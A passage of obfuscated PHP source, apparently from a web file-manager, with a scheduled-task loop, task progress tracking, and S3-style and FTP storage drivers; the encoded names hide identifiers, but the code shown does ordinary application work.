array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Îûáû“ş][832])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $œ‡¬÷ã =& $_SERVER[Îûáû“ş]; if (self::valueGet($œ‡¬÷ã[748]) != $œ‡¬÷ã[88]) { return; } if (self::valueGet($œ‡¬÷ã[1629]) == $œ‡¬÷ã[88]) { $¹í£›µ¼ = self::valueGet($œ‡¬÷ã[1630]); if (time() - $¹í£›µ¼ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$œ‡¬÷ã[1631]] = 1; self::valueSet($œ‡¬÷ã[1629], $œ‡¬÷ã[88]); self::log($œ‡¬÷ã[1632] . ACTION . $œ‡¬÷ã[1633]); Session::$data = array(); Session::$sessionSign = $œ‡¬÷ã[12]; $GLOBALS[$œ‡¬÷ã[494]] = 1; Hook::bind($œ‡¬÷ã[1634], $œ‡¬÷ã[1635]); $¶œ”ã¶ä = 0; while (!0) { self::cacheClear(); if (self::valueGet($œ‡¬÷ã[748]) != $œ‡¬÷ã[88]) { self::valueSet($œ‡¬÷ã[1629], $œ‡¬÷ã[198]); self::log($œ‡¬÷ã[1636]); die; } $Ï®ëŸà = time(); if ($Ï®ëŸà - $¶œ”ã¶ä >= 60) { self::valueSet(array($œ‡¬÷ã[1629] => $œ‡¬÷ã[88], $œ‡¬÷ã[1630] => $Ï®ëŸà), !1); $¶œ”ã¶ä = $Ï®ëŸà; } if (!file_exists(USER_SYSTEM . $œ‡¬÷ã[1637])) { self::valueSet(array($œ‡¬÷ã[1629] => $œ‡¬÷ã[198], $œ‡¬÷ã[748] => $œ‡¬÷ã[198]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ªÊùº =& $_SERVER[Îûáû“ş]; http_close(); self::valueSet($ªÊùº[748], $ªÊùº[198]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ªÊùº[1629] => $ªÊùº[198], $ªÊùº[748] => $ªÊùº[88]), !1); } public static function taskSwitch() { $ªş…Âº¶ =& $_SERVER[Îûáû“ş]; $ÂşûÏ“ = self::valueGet($ªş…Âº¶[748]) == $ªş…Âº¶[88] ? $ªş…Âº¶[198] : $ªş…Âº¶[88]; self::valueSet($ªş…Âº¶[748], $ÂşûÏ“); } public static function shutdownEvent() { $½¸°„û® =& $_SERVER[Îûáû“ş]; self::valueSet($½¸°„û®[1629], $½¸°„û®[198]); self::log($½¸°„û®[1638]); } public static function config($ÛÓøÚÒ§, $¬‡¹´©¤) { self::valueSet($_SERVER[Îûáû“ş][748], $ÛÓøÚÒ§); } private static function taskRunAll() { $ê©†¿…Ü =& $_SERVER[Îûáû“ş]; $‘¹×Ù  = timeFloat(); $¹¤¬Œñ” = Model($ê©†¿…Ü[1639])->listData(); $Ü˜ëê´ = count($¹¤¬Œñ”); for ($ıì½«Î‰ = 0; $ıì½«Î‰ < $Ü˜ëê´; $ıì½«Î‰++) { $ÈÍÈş = $¹¤¬Œñ”[$ıì½«Î‰]; if (!$ÈÍÈş[$ê©†¿…Ü[399]] || $ÈÍÈş[$ê©†¿…Ü[1640]] != $ê©†¿…Ü[88]) { continue; } if (!self::taskTimeCheck($ÈÍÈş)) { continue; } self::taskRun($ÈÍÈş); } Hook::trigger($ê©†¿…Ü[1641]); self::taskQueueRun($‘¹×Ù ); } private static function taskQueueRun($À¿õ»Óó) { $°¢°ÍÒ® = 10; while (!0) { $¸ë¦—ü· = TaskQueue::run(); if ($¸ë¦—ü· === !1) { break; } if (timeFloat() - $À¿õ»Óó >= $°¢°ÍÒ®) { break; } } } private static function taskTimeCheck($ÆËßîá¬) { $Å¯ƒâÅÃ =& $_SERVER[Îûáû“ş]; $æß±”Ùú = json_decode($ÆËßîá¬[$Å¯ƒâÅÃ[180]], !0); $òèÍ‹Ã = intval($ÆËßîá¬[$Å¯ƒâÅÃ[1630]]); $ÊŠÙúèØ = strtotime($Å¯ƒâÅÃ[1642] . $æß±”Ùú[$Å¯ƒâÅÃ[1643]] . $Å¯ƒâÅÃ[1644]) - strtotime($Å¯ƒâÅÃ[1645]); $òÔ—·¸ü = time() - strtotime(date($Å¯ƒâÅÃ[1646]) . $Å¯ƒâÅÃ[1647]); $æäİï¸Ë = $òÔ—·¸ü >= $ÊŠÙúèØ && $òÔ—·¸ü <= $ÊŠÙúèØ + 3600; switch ($æß±”Ùú[$Å¯ƒâÅÃ[33]]) { case $Å¯ƒâÅÃ[1648]: if (time() - $òèÍ‹Ã < 3600 * 24 * 30) { return !1; } if ($æß±”Ùú[$Å¯ƒâÅÃ[1648]] == date($Å¯ƒâÅÃ[1649]) && $æäİï¸Ë) { return !0; } break; case $Å¯ƒâÅÃ[1650]: if (time() - $òèÍ‹Ã < 3600 * 24 * 7) { return !1; } $êĞ·Ì¢ = date($Å¯ƒâÅÃ[1651]) == 0 ? 7 : date($Å¯ƒâÅÃ[1651]); if ($æß±”Ùú[$Å¯ƒâÅÃ[1650]] == $êĞ·Ì¢ && $æäİï¸Ë) { return !0; } break; case $Å¯ƒâÅÃ[1643]: if (time() - $òèÍ‹Ã < 3600 * 24) { return !1; } if ($æäİï¸Ë) { return !0; } break; case $Å¯ƒâÅÃ[1652]: if (time() - $òèÍ‹Ã >= floatval($æß±”Ùú[$Å¯ƒâÅÃ[1652]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¿¤Øåæ¿ =& $_SERVER[Îûáû“ş]; static $ñ®ßÊÃã = 0; $Í®êáñœ = 300; if (!$ñ®ßÊÃã) { $ñ®ßÊÃã = time(); } if (time() - $ñ®ßÊÃã < $Í®êáñœ) { return; } $ñ®ßÊÃã = time(); $ÍêšØÙÜ = Model($¿¤Øåæ¿[504])->db($¿¤Øåæ¿[12]); if ($ÍêšØÙÜ) { $ÍêšØÙÜ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¿¤Øåæ¿[1653], $¿¤Øåæ¿[1654]); die; } } public static function taskRun($ĞÚö÷—×) { $ĞŸƒŸ¨¿ =& $_SERVER[Îûáû“ş]; self::log($ĞŸƒŸ¨¿[1655] . $ĞÚö÷—×[$ĞŸƒŸ¨¿[399]] . $ĞŸƒŸ¨¿[1656] . $ĞÚö÷—×[$ĞŸƒŸ¨¿[32]] . $ĞŸƒŸ¨¿[1657] . $ĞÚö÷—×[$ĞŸƒŸ¨¿[1658]]); Model($ĞŸƒŸ¨¿[1639])->run($ĞÚö÷—×[$ĞŸƒŸ¨¿[399]]); $™Êù¥¨ = timeFloat(); $ëİÅî = $ĞŸƒŸ¨¿[12]; switch ($ĞÚö÷—×[$ĞŸƒŸ¨¿[33]]) { case $ĞŸƒŸ¨¿[307]: $¬õÏîŒó = url_request($ĞÚö÷—×[$ĞŸƒŸ¨¿[1658]], $ĞŸƒŸ¨¿[230], !1, !1, !1, !1, 10); if ($¬õÏîŒó[$ĞŸƒŸ¨¿[748]]) { $ëİÅî = strlen($¬õÏîŒó[$ĞŸƒŸ¨¿[1204]]); } break; case $ĞŸƒŸ¨¿[229]: $ëİÅî = Hook::apply($ĞÚö÷—×[$ĞŸƒŸ¨¿[1658]]); default: break; } Model($ĞŸƒŸ¨¿[1659])->add(array($ĞŸƒŸ¨¿[1660] => $ĞŸƒŸ¨¿[12], $ĞŸƒŸ¨¿[1661] => $ĞŸƒŸ¨¿[198], $ĞŸƒŸ¨¿[33] => $ĞŸƒŸ¨¿[1662] . $ĞÚö÷—×[$ĞŸƒŸ¨¿[399]], $ĞŸƒŸ¨¿[1663] => json_encode(array($ĞŸƒŸ¨¿[32] => $ĞÚö÷—×[$ĞŸƒŸ¨¿[32]], $ĞŸƒŸ¨¿[1664] => timeFloat() - $™Êù¥¨, $ĞŸƒŸ¨¿[293] => $ëİÅî)))); $üùô¦ûö = $ëİÅî ? $ĞŸƒŸ¨¿[1665] . $ëİÅî : $ĞŸƒŸ¨¿[12]; self::log($ĞŸƒŸ¨¿[1666] . $ĞÚö÷—×[$ĞŸƒŸ¨¿[399]] . $ĞŸƒŸ¨¿[164] . $üùô¦ûö); return !0; } private static function valueGet($á…ÎÃÄ¾) { $œü¹…î =& $_SERVER[Îûáû“ş]; $Ñ¹åŠ§É = $œü¹…î[1667]; $½’éı§ı = Model($œü¹…î[435])->get($á…ÎÃÄ¾, $Ñ¹åŠ§É); if (is_null($½’éı§ı)) { Model($œü¹…î[435])->set($œü¹…î[748], $œü¹…î[88], $Ñ¹åŠ§É); Model($œü¹…î[435])->set($œü¹…î[1629], $œü¹…î[198], $Ñ¹åŠ§É); $½’éı§ı = Model($œü¹…î[435])->get($á…ÎÃÄ¾, $Ñ¹åŠ§É); } return $½’éı§ı; } private static function valueSet($æŠ“ ã³, $ÒüıÏÅÃ) { $”±ÚÂ¸ =& $_SERVER[Îûáû“ş]; $´´¨Ë¾¨ = $”±ÚÂ¸[1668]; CacheLock::lock($´´¨Ë¾¨); $–¯ÌäÊ­ = Model($”±ÚÂ¸[435])->set($æŠ“ ã³, $ÒüıÏÅÃ, $”±ÚÂ¸[1667]); CacheLock::unlock($´´¨Ë¾¨); return $–¯ÌäÊ­; } protected static function log($ŠĞğÉÌø) { write_log($ŠĞğÉÌø, $_SERVER[Îûáû“ş][1654]); } private static function cacheClear() { $™…›ÖÜ =& $_SERVER[Îûáû“ş]; Cache::clearMemory(Model($™…›ÖÜ[435])->cacheKey($™…›ÖÜ[1667])); Cache::clearMemory(Model($™…›ÖÜ[435])->cacheKey($™…›ÖÜ[1669])); Model($™…›ÖÜ[1639])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($öã×ÍÕ», $ÀõŞ¹ŸÃ = '', $–‡æƒ×¢ = 0, $ÌäŠ¾¨Æ = '') { $ªÛ‚Ï™¢ =& $_SERVER[Îûáû“ş]; if (self::get($öã×ÍÕ»)) { return; } $this->task = array($ªÛ‚Ï™¢[399] => $öã×ÍÕ», $ªÛ‚Ï™¢[1670] => USER_ID, $ªÛ‚Ï™¢[1570] => $ÌäŠ¾¨Æ, $ªÛ‚Ï™¢[453] => $ªÛ‚Ï™¢[12], $ªÛ‚Ï™¢[33] => $ÀõŞ¹ŸÃ, $ªÛ‚Ï™¢[1066] => $ªÛ‚Ï™¢[12], $ªÛ‚Ï™¢[785] => $–‡æƒ×¢, $ªÛ‚Ï™¢[1671] => 0, $ªÛ‚Ï™¢[1672] => 0, $ªÛ‚Ï™¢[1673] => 0, $ªÛ‚Ï™¢[1674] => timeFloat(), $ªÛ‚Ï™¢[1675] => 0, $ªÛ‚Ï™¢[1676] => 0, $ªÛ‚Ï™¢[1677] => 0, $ªÛ‚Ï™¢[1678] => 0, $ªÛ‚Ï™¢[748] => $ªÛ‚Ï™¢[1629]); $GLOBALS[$ªÛ‚Ï™¢[1679]] = 1; Hook::bind($ªÛ‚Ï™¢[1634], array($this, $ªÛ‚Ï™¢[1680])); Hook::bind($ªÛ‚Ï™¢[1681], array($this, $ªÛ‚Ï™¢[1682])); $this->startAfter(); Hook::trigger($ªÛ‚Ï™¢[1683], $this->task); $this->task[$ªÛ‚Ï™¢[1676]] = timeFloat(); } public function end($œÔÀ±â¤ = '') { $Ÿ¯±Ò¹‹ =& $_SERVER[Îûáû“ş]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Ÿ¯±Ò¹‹[1676]]) { self::valueSet($this->task[$Ÿ¯±Ò¹‹[399]], !1); } $this->isEnd = !0; if ($œÔÀ±â¤) { $this->task[$Ÿ¯±Ò¹‹[453]] = $œÔÀ±â¤; } self::log($Ÿ¯±Ò¹‹[1684] . $this->task[$Ÿ¯±Ò¹‹[399]] . $Ÿ¯±Ò¹‹[1685] . sprintf($Ÿ¯±Ò¹‹[849], timeFloat() - $this->task[$Ÿ¯±Ò¹‹[1674]]) . $Ÿ¯±Ò¹‹[1686]); Hook::unbind($Ÿ¯±Ò¹‹[1634], array($this, $Ÿ¯±Ò¹‹[1680])); Hook::unbind($Ÿ¯±Ò¹‹[1681], array($this, $Ÿ¯±Ò¹‹[1682])); $this->endAfter(); $óã£Ï»Ğ = $this->task; $this->task = !1; Hook::trigger($Ÿ¯±Ò¹‹[1687], $óã£Ï»Ğ); } public function update($ëŞÍ‘à = 0, $â®ƒñíÒ = false) { $šÚã¢–ò =& $_SERVER[Îûáû“ş]; $«ô³ªåÉ =& $this->task; if (!$«ô³ªåÉ) { return; } $«ô³ªåÉ[$šÚã¢–ò[1671]] += $ëŞÍ‘à; $«ô³ªåÉ[$šÚã¢–ò[1675]] = timeFloat(); if ($«ô³ªåÉ[$šÚã¢–ò[785]]) { if ($«ô³ªåÉ[$šÚã¢–ò[785]] < $«ô³ªåÉ[$šÚã¢–ò[1671]]) { $«ô³ªåÉ[$šÚã¢–ò[785]] = $«ô³ªåÉ[$šÚã¢–ò[1671]]; } $å¿Ôï‚Ô = timeFloat() - $«ô³ªåÉ[$šÚã¢–ò[1674]] - $«ô³ªåÉ[$šÚã¢–ò[1677]]; if ($å¿Ôï‚Ô <= 0) { $å¿Ôï‚Ô = 0.001; } $«ô³ªåÉ[$šÚã¢–ò[1672]] = $«ô³ªåÉ[$šÚã¢–ò[1671]] / $«ô³ªåÉ[$šÚã¢–ò[785]]; $«ô³ªåÉ[$šÚã¢–ò[1673]] = $«ô³ªåÉ[$šÚã¢–ò[1671]] / $å¿Ôï‚Ô; if ($«ô³ªåÉ[$šÚã¢–ò[1672]] > 0) { $«ô³ªåÉ[$šÚã¢–ò[1678]] = $å¿Ôï‚Ô * (1 - $«ô³ªåÉ[$šÚã¢–ò[1672]]) / $«ô³ªåÉ[$šÚã¢–ò[1672]]; } $«ô³ªåÉ[$šÚã¢–ò[1678]] = $«ô³ªåÉ[$šÚã¢–ò[1678]] <= 0 ? 0 : $«ô³ªåÉ[$šÚã¢–ò[1678]]; } $this->updateAfter(); $·¶›Ø€ƒ = 0.2; if (timeFloat() - $«ô³ªåÉ[$šÚã¢–ò[1676]] < $·¶›Ø€ƒ && !$â®ƒñíÒ) { return; } $Å¸Ô©¥ = self::get($«ô³ªåÉ[$šÚã¢–ò[399]]); $ğíàÌ†Ñ = $Å¸Ô©¥[$šÚã¢–ò[748]]; if ($ğíàÌ†Ñ == self::STATYS_KILL) { $›ŸÑªèÉ = array($šÚã¢–ò[1688] => LNG($šÚã¢–ò[1689]), $šÚã¢–ò[1214] => !1); Cache::set($šÚã¢–ò[1690] . $this->task[$šÚã¢–ò[399]], $›ŸÑªèÉ, 30); $this->onKill(); $this->end(); die; } else { if ($ğíàÌ†Ñ == self::STATYS_STOP) { $ÑŒÂ‘¬ñ = 2; $Å¸Ô©¥[$šÚã¢–ò[1677]] += $ÑŒÂ‘¬ñ; self::valueSet($«ô³ªåÉ[$šÚã¢–ò[399]], $Å¸Ô©¥); sleep($ÑŒÂ‘¬ñ); $this->update(); return; } } $«ô³ªåÉ[$šÚã¢–ò[748]] = $ğíàÌ†Ñ ? $ğíàÌ†Ñ : $«ô³ªåÉ[$šÚã¢–ò[748]]; $«ô³ªåÉ[$šÚã¢–ò[1677]] = $Å¸Ô©¥[$šÚã¢–ò[1677]] ? $Å¸Ô©¥[$šÚã¢–ò[1677]] : 0; $«ô³ªåÉ[$šÚã¢–ò[1676]] = timeFloat(); Hook::trigger($šÚã¢–ò[1691], $«ô³ªåÉ); self::valueSet($«ô³ªåÉ[$šÚã¢–ò[399]], $«ô³ªåÉ); } public function onKillSet($Ñ¦³£Ù¯, $‰‚íäé× = array()) { $this->onKillCall = array($Ñ¦³£Ù¯, $‰‚íäé×); } public function onKill() { $™¤«‘¯° =& $_SERVER[Îûáû“ş]; self::log($™¤«‘¯°[1684] . $this->task[$™¤«‘¯°[399]] . $™¤«‘¯°[1692]); Hook::trigger($™¤«‘¯°[1693], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($›éöŒÓ) { $Îº†òñ„ =& $_SERVER[Îûáû“ş]; Cache::set($Îº†òñ„[1690] . $this->task[$Îº†òñ„[399]], $›éöŒÓ, 60); return $›éöŒÓ; } public static function get($áòÅŠï) { $³úÏë„£ =& $_SERVER[Îûáû“ş]; $¿î¦™Íí = self::valueGet($áòÅŠï); if (is_array($¿î¦™Íí) && $¿î¦™Íí[$³úÏë„£[1694]]) { $ÎªÔ¼˜€ = ActionApply($¿î¦™Íí[$³úÏë„£[1694]], array($¿î¦™Íí)); $¿î¦™Íí = is_array($ÎªÔ¼˜€) ? $ÎªÔ¼˜€ : $¿î¦™Íí; } return $¿î¦™Íí; } public static function listData() { $Ä»û¯º = self::valueGet(); return array_sort_by($Ä»û¯º, $_SERVER[Îûáû“ş][1674], !0); } public static function kill($áßÚõêŸ) { return self::changeStatus($áßÚõêŸ, self::STATYS_KILL); } public static function stop($¹üÆÁ¬è) { return self::changeStatus($¹üÆÁ¬è, self::STATYS_STOP); } public static function restart($„ßñùĞ–) { return self::changeStatus($„ßñùĞ–, self::STATYS_RUNNING); } public static function killAll() { $Ô’”„Ş¼ =& $_SERVER[Îûáû“ş]; $ŒÛ·ˆ¹™ = self::listData(); foreach ($ŒÛ·ˆ¹™ as $ê½ÑşÜì) { self::kill($ê½ÑşÜì[$Ô’”„Ş¼[399]]); } sleep(2); foreach ($ŒÛ·ˆ¹™ as $ê½ÑşÜì) { self::valueSet($ê½ÑşÜì[$Ô’”„Ş¼[399]], !1); } } private static function changeStatus($¤…ê—®Í, $È—Ö‰ïÅ) { $±ñøÊ»ü =& $_SERVER[Îûáû“ş]; $õê“¬ § = self::valueGet($¤…ê—®Í); if (!$õê“¬ §) { return !1; } $õê“¬ §[$±ñøÊ»ü[748]] = $È—Ö‰ïÅ; self::valueSet($¤…ê—®Í, $õê“¬ §); self::log($±ñøÊ»ü[1695] . $õê“¬ §[$±ñøÊ»ü[399]] . $±ñøÊ»ü[1696] . $È—Ö‰ïÅ); return !0; } public static function valueGet($¢±úÒÆ  = false) { $œ­‰ÃÎ™ =& $_SERVER[Îûáû“ş]; if ($¢±úÒÆ ) { $öÈıòÏ = Model($œ­‰ÃÎ™[447])->where(array($œ­‰ÃÎ™[94] => $¢±úÒÆ , $œ­‰ÃÎ™[33] => $œ­‰ÃÎ™[1073]))->find(); return $öÈıòÏ ? json_decode($öÈıòÏ[$œ­‰ÃÎ™[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($›š”è”Õ = false) { $ò¦»¾— =& $_SERVER[Îûáû“ş]; $¼î‹–Ñ = array($ò¦»¾—[33] => $ò¦»¾—[1073]); if ($›š”è”Õ) { $¼î‹–Ñ[$ò¦»¾—[1670]] = $›š”è”Õ; } $Ù˜ù–– = Model($ò¦»¾—[447])->where($¼î‹–Ñ)->select(); $Ù˜ù–– = $Ù˜ù–– ? $Ù˜ù–– : array(); foreach ($Ù˜ù–– as $ÀØú²âş => $Ï³îõ‘•) { $Ù˜ù––[$ÀØú²âş] = json_decode($Ï³îõ‘•[$ò¦»¾—[374]], !0); } return $Ù˜ù––; } public static function valueSet($ï§ö­ø¼, $¸ö«É¸ê) { $É÷†¯Ñ =& $_SERVER[Îûáû“ş]; if (!$¸ö«É¸ê) { return Model($É÷†¯Ñ[447])->where(array($É÷†¯Ñ[94] => $ï§ö­ø¼, $É÷†¯Ñ[33] => $É÷†¯Ñ[1073]))->delete(); } $ø×ç‡Ï = json_encode($¸ö«É¸ê); if (!$ø×ç‡Ï) { ob_start(); var_dump($¸ö«É¸ê); $ğ¹ĞËÕÕ = ob_get_clean(); self::log($É÷†¯Ñ[1697] . json_encode_force($ğ¹ĞËÕÕ)); } if (!$ï§ö­ø¼ || !$¸ö«É¸ê[$É÷†¯Ñ[399]]) { return !1; } $üµ­ŒÍ˜ = array($É÷†¯Ñ[33] => $É÷†¯Ñ[1073], $É÷†¯Ñ[1670] => USER_ID, $É÷†¯Ñ[94] => $ï§ö­ø¼, $É÷†¯Ñ[374] => $ø×ç‡Ï); $±°êõ¨Î = $É÷†¯Ñ[1698]; CacheLock::lock($±°êõ¨Î); Model($É÷†¯Ñ[447])->add($üµ­ŒÍ˜, array(), !0); CacheLock::unlock($±°êõ¨Î); } public static function log($¶¦²–¹ê) { if (!GLOBAL_DEBUG) { return; } write_log($¶¦²–¹ê, $_SERVER[Îûáû“ş][1699]); } } goto DÆõŒöğÄ; CãœŠÄ«: class PathDriverEDS extends PathDriverMinIO { public function __construct($œÖŒÍßó) { parent::__construct($œÖŒÍßó); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($…½É„„Š) { parent::__construct($…½É„„Š); $this->signatureVersion($_SERVER[Îûáû“ş][216]); } public function uploadFormData($Ï€Ğ­•¨, $ØçôÌÄ“ = 3600) { $áØóÚÈÀ =& $_SERVER[Îûáû“ş]; $Œ¬¸Çñ = $áØóÚÈÀ[199]; $Ü±ùò˜ = $áØóÚÈÀ[1360]; $ºÑ¸ö¸ = $áØóÚÈÀ[62]; $¨Ü…´Ùğ = gmdate($áØóÚÈÀ[1361]); $»óÍ©Ô´ = gmdate($áØóÚÈÀ[749]); $¸ï”¥æÙ = $áØóÚÈÀ[1362]; $÷¶Ò± = $ØçôÌÄ“ . $áØóÚÈÀ[12]; $À”ÀÆ¾¬ = $áØóÚÈÀ[1324]; $Ë·¯Ñª = array($this->accessKey, $»óÍ©Ô´, $this->region, $ºÑ¸ö¸, $¸ï”¥æÙ); $³éÇÙÀ× = implode($áØóÚÈÀ[8], $Ë·¯Ñª); $ Ú·ñ£„ = array($áØóÚÈÀ[1326] => gmdate($áØóÚÈÀ[1325], strtotime($áØóÚÈÀ[1363])), $áØóÚÈÀ[1327] => array(array($áØóÚÈÀ[1329] => $this->bucket), array($áØóÚÈÀ[1328] => $Œ¬¸Çñ), array($áØóÚÈÀ[1330], $áØóÚÈÀ[1331], $áØóÚÈÀ[12]), array($áØóÚÈÀ[1330], $áØóÚÈÀ[1364], $áØóÚÈÀ[12]), array($áØóÚÈÀ[1330], $áØóÚÈÀ[1365], $áØóÚÈÀ[12]), array($áØóÚÈÀ[1332] => $À”ÀÆ¾¬), array($áØóÚÈÀ[1366] => $³éÇÙÀ×), array($áØóÚÈÀ[1367] => $Ü±ùò˜), array($áØóÚÈÀ[1368] => $¨Ü…´Ùğ), array($áØóÚÈÀ[1369] => $÷¶Ò±))); $‹Û¸ßÑõ = base64_encode(json_encode($ Ú·ñ£„)); $öÕÜ„öâ = hash_hmac($áØóÚÈÀ[1370], $»óÍ©Ô´, $áØóÚÈÀ[1371] . $this->secret, !0); $ÜĞãÇ© = hash_hmac($áØóÚÈÀ[1370], $this->region, $öÕÜ„öâ, !0); $ÍßÕíÑ = hash_hmac($áØóÚÈÀ[1370], $ºÑ¸ö¸, $ÜĞãÇ©, !0); $è¾¸—È® = hash_hmac($áØóÚÈÀ[1370], $¸ï”¥æÙ, $ÍßÕíÑ, !0); $ÛÂÎ›Î· = hash_hmac($áØóÚÈÀ[1370], $‹Û¸ßÑõ, $è¾¸—È®); $ÕÇ = array($áØóÚÈÀ[215] => $áØóÚÈÀ[12], $áØóÚÈÀ[1372] => $áØóÚÈÀ[12], $áØóÚÈÀ[1328] => $Œ¬¸Çñ, $áØóÚÈÀ[1332] => $À”ÀÆ¾¬, $áØóÚÈÀ[1336] => $‹Û¸ßÑõ, $áØóÚÈÀ[1373] => $³éÇÙÀ×, $áØóÚÈÀ[1374] => $Ü±ùò˜, $áØóÚÈÀ[1375] => $¨Ü…´Ùğ, $áØóÚÈÀ[1376] => $÷¶Ò±, $áØóÚÈÀ[1377] => $ÛÂÎ›Î·, $áØóÚÈÀ[182] => $this->getHost()); return $ÕÇ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($©Àš‰µ) { parent::__construct(); if (count($©Àš‰µ) > 0) { $this->_init($©Àš‰µ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ı”œ ³š) { $¢öÚº¾µ =& $_SERVER[Îûáû“ş]; global $config; $this->appCharset = $config[$¢öÚº¾µ[1378]]; $this->systemCharset = $config[$¢öÚº¾µ[1379]]; if (isset($ı”œ ³š[$¢öÚº¾µ[1380]]) && $ı”œ ³š[$¢öÚº¾µ[1380]]) { $this->systemCharset = $ı”œ ³š[$¢öÚº¾µ[1380]]; } } public function iconvApp($å½†„¦à) { return $this->iconvTo($å½†„¦à, $this->systemCharset, $this->appCharset); } public function iconvSystem($›Šú¯) { return $this->iconvTo($›Šú¯, $this->appCharset, $this->systemCharset); } public function getPathOuter($¡¥¿šûÀ) { $ÖÉâ¯›Ä =& $_SERVER[Îûáû“ş]; $­ÁÅö“˜ = $this->iconvApp($this->pathBase); $¡¥¿šûÀ = $this->iconvApp($¡¥¿šûÀ); if (substr($­ÁÅö“˜, 0, 2) == $ÖÉâ¯›Ä[1381]) { $­ÁÅö“˜ = BASIC_PATH . substr($­ÁÅö“˜, 2); } if (substr($¡¥¿šûÀ, 0, 2) == $ÖÉâ¯›Ä[1381]) { $¡¥¿šûÀ = BASIC_PATH . substr($¡¥¿šûÀ, 2); } $­ÁÅö“˜ = KodIO::clear($­ÁÅö“˜); $¡¥¿šûÀ = KodIO::clear($¡¥¿šûÀ); $¡¥¿šûÀ = substr($¡¥¿šûÀ, strlen($­ÁÅö“˜)); if (empty($this->pathDriver)) { return $¡¥¿šûÀ; } return $this->pathDriver . $ÖÉâ¯›Ä[8] . ltrim($¡¥¿šûÀ, $ÖÉâ¯›Ä[8]); } private function _init($ò•§Ú…ì = array()) { $¹™¾˜­ =& $_SERVER[Îûáû“ş]; if (!function_exists($¹™¾˜­[1382])) { throw new Exception(LNG($¹™¾˜­[1383])); } $this->config = $ò•§Ú…ì; $this->charsetReset($ò•§Ú…ì); foreach ($ò•§Ú…ì as $‹’ÈÃã => $Í‘ïÊú›) { if (isset($this->{$‹’ÈÃã})) { $this->{$‹’ÈÃã} = $Í‘ïÊú›; } } return $this->_login($ò•§Ú…ì); } private function _login($ÌÒ¨Øûˆ) { $¸¼øà´í =& $_SERVER[Îûáû“ş]; static $™‘Ù‡Ş = array(); $ŠúºŠÜÖ = md5(json_encode($ÌÒ¨Øûˆ)); if (isset($™‘Ù‡Ş[$ŠúºŠÜÖ])) { foreach ($™‘Ù‡Ş[$ŠúºŠÜÖ] as $–ÖšÓ«¿ => $¶ãÍøÒÁ) { $this->{$–ÖšÓ«¿} = $¶ãÍøÒÁ; } return !0; } $ÛË”·Í = parse_url(trim($this->server, $¸¼øà´í[8])); $this->host = $ÛË”·Í[$¸¼øà´í[182]]; $¼ÈøÒĞ· = isset($ÛË”·Í[$¸¼øà´í[181]]) && $ÛË”·Í[$¸¼øà´í[181]] == $¸¼øà´í[1384] ? !0 : !1; $this->scheme = $¼ÈøÒĞ· ? $¸¼øà´í[1385] : $¸¼øà´í[1386]; $this->port = isset($ÛË”·Í[$¸¼øà´í[183]]) ? $ÛË”·Í[$¸¼øà´í[183]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ÚÌò…÷ê = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $úèå†öù = $this->pasv == $¸¼øà´í[88] ? !0 : !1; @ftp_pasv($this->connect, $úèå†öù); $™‘Ù‡Ş[$ŠúºŠÜÖ] = array($¸¼øà´í[1387] => $this->connect, $¸¼øà´í[182] => $this->host, $¸¼øà´í[181] => $this->scheme, $¸¼øà´í[183] => $this->port); return $ÚÌò…÷ê; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($·–âïÀ, $×Ü¢¡„Ú = '', $€€éèŒ³ = REPEAT_RENAME) { if ($this->setContent($·–âïÀ, $×Ü¢¡„Ú)) { return $this->getPathOuter($·–âïÀ); } return !1; } public function mkdir($§®ªõÛ£, $Ò÷î¢§ç = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $§®ªõÛ£ = $this->iconvSystem($§®ªõÛ£); if ($this->_isFolder($§®ªõÛ£) || @ftp_mkdir($this->connect, $§®ªõÛ£)) { return $this->getPathOuter($§®ªõÛ£); } if (!$this->mkdir($this->pathFather($§®ªõÛ£))) { return !1; } if ($§®ªõÛ£ = @ftp_mkdir($this->connect, $§®ªõÛ£)) { return $this->getPathOuter($§®ªõÛ£); } return !1; } public function copyFile($À‹İ¶ç³, $Çø€¨’İ) { if (!$this->_isconn()) { return !1; } $®ĞğéÔ = $this->pathThis($this->iconvSystem($À‹İ¶ç³)); $åÅµ­§ = $this->tempFile($®ĞğéÔ); $ÎÈ‘ßòö = $this->iconvApp($åÅµ­§); $this->download($À‹İ¶ç³, $ÎÈ‘ßòö); $©’’¨ë‹ = $this->upload($Çø€¨’İ, $ÎÈ‘ßòö); $this->tempFileRemve($åÅµ­§); return $©’’¨ë‹; } public function moveFile($ñ¥¦Ó, $«ÊÎ¡ÂÃ) { if (!$this->_isconn()) { return !1; } $ñ¥¦Ó = $this->iconvSystem($ñ¥¦Ó); $«ÊÎ¡ÂÃ = $this->iconvSystem($«ÊÎ¡ÂÃ); $Ò¼ÆˆŒò = 